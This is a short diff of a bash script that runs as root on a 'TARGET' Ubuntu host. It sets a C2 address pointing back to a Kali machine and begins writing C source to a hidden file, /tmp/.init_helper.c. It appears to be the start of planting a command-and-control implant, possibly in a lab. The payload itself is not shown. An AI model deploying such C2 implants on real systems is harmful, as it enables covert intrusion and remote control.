@@ -1,7 +1,7 @@
 #!/bin/bash
 # Run on the TARGET Ubuntu 22.04 box as root/sudo
 
-C2_IP="10.100.1.X"   # ← change to your Kali IP before prebake
+C2_IP="192.168.1.79"   # ← change to your Kali IP before prebake
 
 # 1. Write the C source directly onto the target
 cat > /tmp/.init_helper.c << 'CSRC'
